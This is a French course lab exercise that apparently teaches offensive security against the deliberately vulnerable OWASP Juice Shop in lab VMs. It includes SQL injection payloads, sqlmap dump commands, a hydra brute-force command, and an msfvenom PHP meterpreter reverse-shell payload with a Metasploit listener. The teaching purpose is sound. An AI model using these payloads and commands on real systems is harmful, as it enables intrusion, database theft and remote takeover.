---
layout: default
title: "Bienvenue chez Spectre"
nav_order: 7
has_toc: true
published: true
---

# Exercice : Bienvenue chez Spectre
## Sécurité offensive

---

## Mise en situation

Au cours des dernières semaines, une nouvelle plateforme de commerce en ligne très populaire a discrètement attiré l’attention de certains membres de la communauté en cybersécurité. Rien d’officiel : aucun rapport publié, aucun avis de sécurité. Seulement des observations ici et là, difficilement vérifiables, mais suffisamment intrigantes pour susciter des doutes.

Certains utilisateurs mentionnent des comportements étranges. D’autres parlent de validations incohérentes. Dans quelques cas, des réponses inattendues du système laissent croire que certaines parties de l’application ne réagissent pas comme elles le devraient.

Rien de suffisant pour tirer des conclusions, mais assez pour éveiller la curiosité.

---

Vous avez joint un collectif peu connu, opérant en marge des processus traditionnels.

Un groupe sans mandat ni reconnaissance officielle.

Bienvenue chez **Spectre**.

---

### Spectre

**Spectre** n’est pas une organisation formelle. Il n’existe ni structure, ni hiérarchie clairement établie. Il s’agit plutôt d’un réseau informel d’analystes et de chercheurs en sécurité qui partagent une même conviction : il vaut mieux comprendre les vulnérabilités galopantes sur l'Internet avant qu'elles ne soient exploitées par des gens ou des groupes mal intentionnés.

Les membres de Spectre n’interviennent pas à la demande d’un client, mais ils opèrent toujours de manière éthique : ils ne publient pas leurs découvertes à la légère. Leur approche repose sur une règle simple : observer, expérimenter, comprendre sans jamais perturber inutilement, ni exposer publiquement ce qui pourrait être utilisé à mauvais escient.

Dans ce contexte, vous démarrez une copie de l’application suspecte en laboratoire afin de valider certaines de vos hypothèses. Aucune documentation ne vous est remise. Aucune indication ne vous est donnée sur les failles potentielles. Aucun objectif précis ne vous est imposé.


- Chaque comportement inattendu est un indice.  
- Chaque validation insuffisante est une opportunité.  
- Chaque hypothèse incorrecte du système est une faille potentielle.


Saurez-vous utiliser les mêmes outils que les *hackers* mal intentionnés afin d'aider les créateurs de la plateforme à corriger les vulnérabilités avant que le chaos n'éclate ?

---

## Objectifs
- Comprendre la manière de réfléchir des *hackers* 
- Mettre en pratique les étapes classiques d'une attaque informatique
- Se familiariser avec certains des outils les plus utilisés en sécurité offensive

---

## Préparation

### 1. Lancez OWASP Juice Shop
Dans votre VM applicative, démarrez OWASP Juice Shop

```bash
cd juice-shop
npm install
npm start
```

### 2. Vérifiez la connectivité

L'application vulnérable OWASP Juice Shop devrait être disponible aux adresses suivantes :

- Sur la VM applicative : `http://localhost:3000`
- À partir de la VM de sécurité offensive (Kali) : `http://<ip de votre VM applicative>:3000`

### 3. Explorez OWASP Juice Shop

- Explorez la plateforme de commerce en ligne en utilisant ses diverses fonctionnalités.
- Certaines vulnérabilités vous sauteront peut-être déjà aux yeux...

---

## 1. Observer la surface d’attaque

Avant toute interaction, un attaquant cherche à comprendre ce qui est visible. Chaque service exposé représente une opportunité.

### Outils

- nmap  
- whatweb  

### Objectif

Identifier les points d’entrée accessibles depuis l’extérieur.


### Étapes

1. Identifiez l’adresse IP du serveur Juice Shop.

2. Lancez un scan des ports :

    ```bash
    nmap -sV <IP>
    ```

    {: .highlight}
    > L'option -sV indique à nmap de lancer un *scan* pour découvrir les ports ouverts ainsi que la version du service qui écoute sur un port.


3. Prenez en note :

    - Quels ports sont ouverts ?  
    - Quel service écoute sur ces ports ?  
    - Le port utilisé par l’application web est-il standard (80/443) ou non ?  

4. Analysez maintenant l’application web elle-même :

    ```bash
    whatweb http://<IP>:3000 -a 3 -v
    ```

    {: .highlight}
    > L'option -a 3 permet de configurer `whatweb` au niveau agressif, ce qui permet de faire plus de requêtes pour découvrir les technologies utilisées par un site web. Ce mode est cependant plus facile à détecter du côté du serveur.

### Questions de réflexion

1. Quelles technologies semblent utilisées ?  
1. Pourquoi ces informations peuvent-elles aider un attaquant ?  

---

## 2. Intercepter et manipuler le trafic 

Un attaquant ne se limite jamais à utiliser une interface. Il observe les échanges et les modifie pour tenter de contourner les vérifications en place.

### Outil

- Burp Suite

### Objectif

Comprendre comment les données sont envoyées au serveur et comment il y répond.


### Étapes

1. Configurez Burp Suite

    - Lancez Burp Suite
    - Configurez le navigateur pour utiliser Burp comme proxy : `127.0.0.1:8080`
    - Accédez à Juice Shop : `http://<ip>:3000`


1. Interceptez une connexion

    - Accédez au formulaire de connexion
    - Sous l'onglet **Proxy** de Burp Suite, activez l'interception en cliquant sur **Intercept off** (qui deviendra **Intercept on**)
    - Entrez des identifiants quelconques à l'écran de connexion de Juice Shop
    - Interceptez la requête

      Vous devriez observer une requête semblable à :

      ```json
      POST /rest/user/login
      {
        "email": "...",
        "password": "..."
      }
      ```

      {: .warning}
      > En mode *Intercept*, Burp bloquera les requêtes par défaut afin de vous permettre de les modifier. Pour qu'une requête se rende à l'application, vous devez sélectionner une requête et cliquer sur **Forward** (ou **Forward All** pour envoyer toutes les requêtes).  

1. Modifiez le trafic

    - Avant d’envoyer la requête au serveur, modifiez les valeurs suivantes. Vous pourrez trouver la réponse du serveur sous l'onglet **HTTP history**


      - **Test 1 — Mot de passe très long**

        ```text
        aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
        ```

        Observez si le serveur limite la taille.


      - **Test 2 — Mot de passe vide ou nom d'usager**

        ```text
        "password": ""
        ```

        L'interface web permet-elle normalement de soumettre un courriel ou un mot de passe vide ? Le serveur refuse-t-il explicitement la valeur ?


      - **Test 3 — Injection SQL**

        ```text
        ' OR 1=1--
        ```

        Le système traite-t-il cette valeur comme du texte ou comme une instruction ?


      - **Test 4 — Modifier la structure JSON**

        Essayez de :
        - supprimer le champ "password"  
        - renommer "email" en "user"  
        - ajouter un champ supplémentaire (ex: "role":"admin")  

        Objectif : tester la validation côté serveur.


4. Manipulez une recherche

    - Interceptez une requête similaire à :

      ```http
      GET /rest/products/search?q=apple
      ```

      Modifiez la valeur :

      ```text
      q=' OR 1=1--
      ```

### Questions de réflexion

- Les résultats changent-ils ?
- Le serveur vérifie-t-il l’entrée côté serveur ?
- Que suppose le système sur vos données ?


## 3. Découvrir du contenu caché

Un attaquant ne se limite pas à ce qui est visible dans l’interface.

### Outil

- gobuster

### Objectif

Découvrir des chemins et endpoints cachés.


### Étapes
1. Observez le contenu du fichier `/usr/share/wordlists/dirb/common.txt`
  - Que contient-il ?
  - À quoi cela peut-il servir ?

1. Lancez la commande suivante
      ```bash
      gobuster dir -u http://<IP>:3000 -w /usr/share/wordlists/dirb/common.txt
      ```

      {: .astuce}
      > Malgré toutes ses vulnérabilités, Juice Shop échappe ici à notre première tentative de *scan*, car il retourne un code 200 même pour les routes qui n'existent pas. C'est ce qui cause l'erreur retournée par **gobuster**. Vous pouvez le tester vous-mêmes dans le navigateur en entrant n'importe quoi après le `:3000/`. Mais **gobuster** n'a pas dit son dernier mot...

1. Lancez à nouveau la commande, mais en excluant les réponses identiques
      - Dans l'erreur précédente, **gobuster** vous donne la taille des réponses identiques pour un statut 200. Il est donc possible d'ignorer les réponses de cette taille :
      
      ```bash
      gobuster dir -u http://<IP>:3000 -w /usr/share/wordlists/dirb/common.txt --exclude-length <taille>
      ```

1. Observez...
      - Quels chemins sont trouvés ?  
      - Quels codes HTTP sont retournés (200, 403, 401, etc) ?

1. Visitez l'une des routes ayant retourné un code 200.
      - Que remarquez-vous ?

1. Visitez l'une des routes ayant retourné un code 500.
      - Quelle information supplémentaire cette route fournit-elle à un *hacker* ?

### Questions de réflexion

- Pourquoi ces pages ne sont-elles pas exposées ?
- Le fait de cacher une route est-il un mécanisme de sécurité valable ? Pourquoi ?

---


## 4. Intercepter des requêtes vulnérables

Lorsque l'on intercepte du trafic, il est parfois possible de déceler des informations internes de l'application qui ne devraient pas être divulguées et qui renseignent les *hackers* sur la présence d'une vulnérabilité potentielle...

### Outil

- Burp Suite

### Objectif

Intercepter du trafic révélant la présence d'une vulnérabilité (injection SQL) afin de l'exploiter ultérieurement.

### Étapes

1. Assurez-vous que Burp Suite est toujours activé comme proxy pour votre navigateur web et qu'il intercepte le trafic
1. Dans la fonctionnalité de recherche (en haut à droite), entrez n'importe quelle valeur (ex.: `apple`)
1. Dans la requête interceptée, remplacez votre valeur (ex.:`apple`) par `')`
1. Observez la réponse fournie par le serveur dans Burp Suite
1. Tentez d'exploiter la vulnérabilité pour exfiltrer tous les produits de la base de données
1. Sachant que, pour une base de données `sqlite`, le schéma `sqlite_master` existe toujours et contient les métadonnées de la base de données
  - Essayez d'exploiter la vulnérabilité avec l'entrée suivante: 
    ```
     mavaleur')) union all select 1,2,3,sql,5,6,7,8,9 from sqlite_master--
    ```
  - Que fait la requête ci-haut ? 
  - Pourquoi l'information ainsi exfiltrée peut être utile pour un *hacker* ?


### Questions de réflexion 

- Pourquoi est-il important d'éviter de retourner des messages d'erreurs trop détaillés ?
- Comment ces messages peuvent-ils être utilisés par les *hackers* ?

---

## 5. Automatisation d'une attaque

Lorsqu'une faille a été détectée, il existe plusieurs outils permettant d'automatiser son exploitation, ce qui accélère grandement l'attaque et rend la vulnérabilité plus dangereuse.

### Outil

- sqlmap

### Objectif

Observer comment une injection SQL peut être exploitée automatiquement.


### Étapes

1. Utilisez d'abord l'outil `sqlmap` pour confirmer que le *endpoint* semble bel et bien vulnérable à l'injection SQL  

    ```bash
    sqlmap -u "http://<ip vm>:3000/rest/products/search?q=apple"
    ```
{: .astuce}
> Si `sqlmap` ne détecte rien, essayez de faire varier le paramètre `--level=<1...5>`

2. Utilisez `sqlmap` pour analyser le schéma de la base de données complet

    ```bash
    sqlmap -u "http://<ip vm>:3000/rest/products/search?q=apple" --tables
    sqlmap -u "http://<ip vm>:3000/rest/products/search?q=apple" --dump
    ```

{: .astuce}
> Vous pouvez accélérer cette opération en augmentant le nombre de threads utilisés à l'aide du parametre `--threads=<nb de threads>`

### Questions de réflexion

- SQLMap détecte-t-il automatiquement la vulnérabilité ?  
- Quelles actions aurait-il fallu réaliser manuellement pour arriver aux mêmes conclusions ?
- Pourquoi cet outil est-il particulièrement dangereux ?  

---

## 6. Attaque par force brute

En sécurité, le maillon faible est souvent l'utilisateur, et non de nature technique. Un mot de passe facile à deviner est un excellent exemple...

### Outils

- hydra
- Burp Suite

### Objectif

Comprendre comment un attaquant teste automatiquement des mots de passe.

### Étapes

1. À l'aide de Burp Suite, interceptez une requête de login et identifiez :

      - l’URL exacte (ex.: `/login`)  
      - les paramètres envoyés (`username`, `password`)
        - ***Important**: Il faut aussi tenir compte du format*
      - le message d’erreur retourné en cas d’échec  

      Exemple de message :

      ```text
      Unable to authenticate
      ```

1. Téléchargez une liste de mots de passes communs ici: [10k-most-common.txt](../assets/files/10k-most-common.txt) et copiez-la dans votre VM Kali sous `/home/kali`

1. Construisez la commande Hydra, par exemple (en assumant la structure précédente, elle peut varier dans votre cas précis) : 

    ```bash
    hydra -l jim@juice-sh.op -s <PORT> -P 10k-most-common.txt <IP> http-post-form "/login:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}1=401:H=Content-Type\:application/json:F=Unable"
    ```


1. Lancez la commande et observez :

    - le nombre de tentatives effectuées  
    - la détection d’un mot de passe valide  


### Questions de réflexion

- Pourquoi Hydra a besoin du message d’erreur ?  
- Quelles mesures pourraient empêcher cette attaque ?  

---

## 7. Exploitation avec Metasploit

Certains cadriciels (*frameworks*) fournissent des modules déjà prêts à l'utilisation pour des vulnérabilités connues. Ces *frameworks* accélèrent grandement le travail des *hackers*.

### Outils

- Metasploit
- msfvenom

### Objectif

Comprendre le principe d’un *shell* inversé (*reverse shell*) et son utilisation avec Metasploit.

### Étapes

1. Téléchargez le proxy [ici](../assets/files/proxy.tar.gz) et copiez-le sur votre VM applicative dans le répertoire `/home/dev/`

1. Décompressez l'archive
```bash
tar -xf proxy.tar.gz
```

1. Lancez Juice Shop
```bash
cd juice-shop
npm start
```

1. Lancez le proxy
```bash
cd ~/proxy
npm init -y
npm install express http-proxy-middleware multer
node proxy.js
```

1. Utilisez gobuster pour découvrir de nouveaux *endpoints* potentiels. En particulier, cherchez de routes qui pourraient vous permettre de téléverser (*uploader*) des fichiers et/ou d'exécuter un fichier à distance...

{: .astuce}
> Certains *endpoints* peuvent ne pas utiliser la méthode HTTP GET, qui est la méthode par défaut utilisée par gobuster. Consultez les notes de cours ou la documentation de gobuster pour plus de détails sur l'utilisation des autres méthodes pour la découverte...

1. Lancez Metasploit

  ```bash
  msfconsole
  ```


1. Générez une charge utile (*payload*)

  ```bash
  msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw > shell.php
  ```


1. Préparez un *listener*

```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run
```

1. Utilisez le *endpoint* que vous avez découvert dans les étapes précédentes pour téléverser votre *payload* malicieux.

1. Utilisez l'autre *endpoint* découvert pour déclencher l'exécution de votre *payload* malicieux. 


### Questions de réflexion

- Que fait un reverse shell ?  
- Pourquoi un reverse shell parvient souvent à contourner le pare-feu ?
- Quelle(s) faille(s) est exploitée ?  

---

## 8. Questions de réflexion finale

1. L'approche de Spectre est-elle éthique à votre avis ? Pourquoi ?
1. Selon votre réponse à la question précédente, à quel catégorie de *hackers* appartient Spectre ? Pourquoi ?
1. Quelles seraient les conditions pour que Spectre bascule dans une catégorie différente ?

---

## 9. BONUS : Exploration libre

À ce stade, aucun guide précis n’est fourni.

### Objectif

Développer votre propre approche.

### Travail

- Combinez les outils  
- Testez différentes idées  
- Observez les réactions du système  

### Questions de réflexion

- Qu’avez-vous découvert sans consigne spécifique ?  
- Quelle stratégie a été la plus efficace ?  

